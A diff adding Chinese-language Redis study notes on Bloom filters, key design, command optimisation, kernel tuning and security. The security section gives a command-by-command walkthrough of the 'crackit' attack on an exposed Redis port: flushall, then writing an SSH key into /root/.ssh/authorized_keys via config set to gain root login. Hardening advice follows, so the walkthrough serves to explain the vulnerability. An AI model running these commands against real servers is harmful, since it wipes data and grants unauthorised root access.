@@ -1735,3 +1735,313 @@ cachecloud
 进入后台管理，点击机器管理，添加新机器
 
 2. 添加应用
+
+## 布隆过滤器
+
+实现原理：一个很长的二进制向量和若干个哈希函数
+参数：m 个二进制向量，n 个预备数据，k 个哈希函数
+
+### 误差率
+
+- 肯定存在误差：恰好都命中了
+- 直观因素：m/n 的比率，hash 函数的个数
+- m/n 与误差率成反比，k 与误差率成反比
+
+### 本地布隆过滤器
+
+- 现有库：guava
+
+参考：[http://ifeve.com/google-guava-hashing](http://ifeve.com/google-guava-hashing)
+
+- 本地布隆过滤器的问题：
+  - 容量受限制
+  - 多个应用存在多个布隆过滤器，构建同步复杂
+
+### Redis 布隆过滤器
+
+基于位图实现
+
+#### 实现方法
+
+- 定义布隆过滤器构造参数：m、n、k、误差率
+- 定义布隆过滤器操作函数：add 和 contain
+- 封装 Redis 位图操作
+- 开发测试样例
+
+#### 基于 Redis 单机实现存在的问题
+
+- 速度慢：比本地慢，输出网络
+  - 解决：单独部署，与应用同机房甚至机架部署
+- 容量受限：Redis 最大字符串为 512MB、Redis 单机容量
+  - 解决：基于 Redis Cluster 实现
+
+### Redis 分布式布隆过滤器
+
+- 多个布隆过滤器：二次路由
+- 基于 Pipeline 提高效率
+
+## 开发规范
+
+### 键值设计
+
+#### key 设计
+
+- 可读性和可管理性：以业务名(或数据库名)为前缀(防止 key 冲突)，用冒号分割，比如业务名:表名:id,如：ugc:video:1
+- 简洁性：保证语义的前提下，控制 key 的长度，当 key 较多，内存占用也不容忽视(redis3:39 字节 embstr)，如：user:{uid}:friends:messages:{mid}简化为 u:{uid}:fr:m:{mid}
+- 不要包含特殊字符：反例：包含空格、换行、单双引号以及其他转义字符
+
+#### Value 设计
+
+- 拒绝 bigkey
+  - string 类型控制在 10KB 以内
+  - hash、list、set、zset 元素个数不要超过 5000
+- 选择合适的数据结构
+- 过期设计
+
+#### bigkey 危害
+
+- 网络阻塞
+- Redis 阻塞
+- 集群节点数据不均衡
+- 频繁序列化：应用服务器 CPU 消耗
+
+#### bigkey 发现
+
+- 应用异常
+- `redis-cli --bigkeys`
+- scan + debug object key
+- 主动报警：网络流量监控、客户端监控
+- 内核热点 key 问题优化
+
+#### bigkey 删除
+
+1. 阻塞：注意隐形删除(过期、rename 等)
+2. Redis4.0：lazy delete(unlink 命令)
+
+#### bigkey 预防
+
+- 优化数据结构：例如二级拆分
+- 物理隔离或者万兆网卡：不是治标方案
+- 命令优化：hgetall->hmget、hscan
+- 报警和定期优化
+
+### 键值生命周期
+
+- 周期数据需要设置过期时间，`object idle time`可以找垃圾 key-value
+- 过期时间不宜集中：缓存穿透和雪崩等问题
+
+### 命令优化
+
+1. O(N)以上命令关注 N 的数量
+
+例如：hgetall、lrange、smembers、zrange、sinter 等并非不能使用，但是需要明确 N 的值。有遍历的需求可以使用 hscan、sscan、zscan 代替
+
+2. 禁用命令
+
+禁止线上使用 keys、flushall、flushdb 等，通过 redis 的 rename 机制禁掉命令，或者使用 scan 的方式渐进式处理
+
+3. 合理使用 select
+
+- redis 的多数据库较弱，使用数字进行区分
+- 很多客户端支持较差
+- 同时多业务用多数据库实际还是单线程处理，会有干扰
+
+4. 使用批量操作提高效率
+
+原生命令：例如 mget、mset
+
+非原生命令：可以使用 pipeline 提高效率。 但要注意控制一次批量操作的元素个数(例如 500 以内，实际也和元素字节数有关)
+
+::: warning
+注意两者不同：
+
+原生是原子操作，pipeline 是非原子操作
+
+pipeline 可以打包不同的命令，原生做不到
+
+pipeline 需要客户端和服务端同时支持
+:::
+
+5. Redis 事务功能较弱，不建议过多使用
+
+- Redis 的事务功能较弱(不支持回滚)
+- 集群版本(自研和官方)要求一次事务操作的 key 必须在一个 slot 上(可以使用 hashtag 功能解决)
+
+6. Redis 集群版本在使用 Lua 上有特殊要求
+
+- 所有 key，必须在 1 个 slot 上，否则直接返回 error
+- "-ERR eval/evalsha command keys must in same slot\r\n"
+
+7. 必要情况下使用 monitor 命令时，要注意不要长时间使用
+
+### 客户端优化
+
+1. 避免多个应用使用一个 Redis 实例
+
+正例：不相干的业务拆分，公共数据做服务化。
+
+2. 使用带有连接池的数据库，可以有效控制连接，同时提高效率
+
+3. 高并发下建议客户端添加熔断功能(例如 netflix hystrix)
+
+4. 设置合理的密码，如有必要可以使用 SSL 加密访问（阿里云 Redis 支持）
+
+5. 根据自身业务类型，选好 maxmemory-policy(最大内存淘汰策略)，设置好过期时间
+
+默认策略是 volatile-lru，即超过最大内存后，在过期键中使用 lru 算法进行 key 的剔除，保证不过期数据不被删除，但是可能会出现 OOM 问题。
+
+其他策略如下：
+
+allkeys-lru：根据 LRU 算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止
+
+allkeys-random：随机删除所有键，直到腾出足够空间为止
+
+volatile-random: 随机删除过期键，直到腾出足够空间为止
+
+volatile-ttl：根据键值对象的 ttl 属性，删除最近将要过期数据。如果没有，回退到 noeviction 策略
+
+noeviction：不会剔除任何数据，拒绝所有写入操作并返回客户端错误信息”(error) OOM command not allowed when used memory”，此时 Redis 只响应读操作
+
+## 开发运维
+
+### Linux 内核优化
+
+- vm.overcommit_memory
+
+```shell
+#获取
+cat /proc/sys/vm/overcommit_memory
+#设置
+#echo "vm.overcommit_memory=1" >> /etc/sysctl.conf
+sysctl vm.overcommit_memory=1
+```
+
+1. Redis 设置合理的 maxmemory，保证机器有 20%~30%的闲置内存
+2. 集中化管理 AOF 重写和 RDB 的 bgsave
+3. 设置 vm.overcommit_memory=1，防止极端情况下会造成 fork 失败
+
+- swappiness
+
+```shell
+#立即生效
+echo {bestvalue} > /proc/sys/vm/swappiness
+#永久生效
+echo vm.swappiness={bestvalue} >> /etc/sysctl.conf
+```
+
+如果 Linux>3.5， vm.swappiness=1，否则 vm.swappiness=0，从而实现如下两个目标：
+
+- 物理内存充足时候，使 Redis 足够快
+- 物理内存不足时候，避免 Redis 死掉(如果当前 Redis 为高可用，死掉比阻塞更好)
+- THP(Transparent huge page)
+
+1. 作用加速 fork
+2. 建议：禁用，可能产生更大的内存开销
+3. 坑：源码中是绝对路径，注意不同发行版本的区别
+
+```shell
+echo never > /sys/kernel/mm/transparent_hugepage/enabled
+```
+
+- OOM killer
+
+1. 作用：内存使用溢出，操作系统按照规则 kill 掉某些进程
+2. 配置方法：/proc/{progress_id}/oom_adj 越小，被杀掉概率越小
+3. 运维经验：不要过度依赖此特性，应该合理管理内存
+
+- NTP(Net Time Protocol)
+  对时
+- ulimit
+
+- TCP backlog
+
+```shell
+cat /proc/sys/net/core/somaxconn
+echo 511 > /proc/sys/net/core/somaxconn
+```
+
+### 安全
+
+#### Redis crackit 漏洞
+
+参考：[https://www.aneasystone.com/archives/2015/11/redis-crackit.html](https://www.aneasystone.com/archives/2015/11/redis-crackit.html)
+
+1. 首先确认当前(攻击前)机器 A 不能通过 ssh 访问机器 B，因为没有权限
+
+```shell
+ssh root@192.168.153.130
+```
+
+2. 由于机器 B 的外网对外开题了 Redis 的 6379 端口，所以可以直接连接到 Redis 上执行 flushall 操作，注意此时破坏性已经很大了
+
+```shell
+redis-cli -h 192.168.153.130 -p 6379 ping
+redis-cli -h 192.168.153.130 -p 6379 flushall
+```
+
+3. 在机器 A 生成公钥，并将公钥保存到一个文件 my.pub 中
+
+```shell
+ssh-keygen -t rsa
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > my.pub
+```
+
+4. 将公钥作为 value 添加到 Redis 中
+
+```shell
+cat my.pub | redis-cli -h 192.168.153.130 -p 6379 -x set crackit
+redis-cli -h 192.168.153.130 -p 6379 get crackit
+```
+
+5. 将 Redis 的 dir 设置为 /root/.ssh/目录，dbfilename 设置为 authorized_keys
+
+```shell
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save
+```
+
+6. 此时再次通过 ssh 协议访问机器 B，发现顺利登陆
+
+```shell
+ssh root@192.168.153.130
+```
+
+登陆后可以观察/root/.ssh/authorized_keys，可以发现它就是 RDB 文件
+
+```shell
+cat /root/.ssh/authorized_keys
+```
+
+#### 安全法则
+
+1. 设置密码
+
+- 服务端配置：requirepass 和 masterauth
+- 客户端连接：auth 命令和-a 参数
+- 相关建议：
+  - 密码要足够复杂，防止暴力破解
+  - masterauth 不要忘记
+  - auth 还是通过明文传输
+
+2. 伪装危险命令
+
+- 服务端配置：rename-command 为空或者随机字符
+- 客户端连接：不可用或者使用指定随机字符
+- 相关建议：
+  - 不支持 config set 动态设置
+  - RDB 和 AOF 如果包含 rename-command 之前的命令，将无法使用
+  - rename-command 命令本身是在 Redis 内核会使用到，不建议设置
+
+3. bind
+
+- 服务端配置：bind 限制的是网卡，并不是客户端 ip
+- 相关建议：
+  - bind 不支持 config set
+  - bind 127.0.0.1 需要谨慎
+  - 如果存在外网网卡尽量屏蔽掉
+
+4. 防火墙
+5. 定期备份
+6. 不使用默认端口，防止被弱攻击杀掉
+7. 使用非 root 用户启动
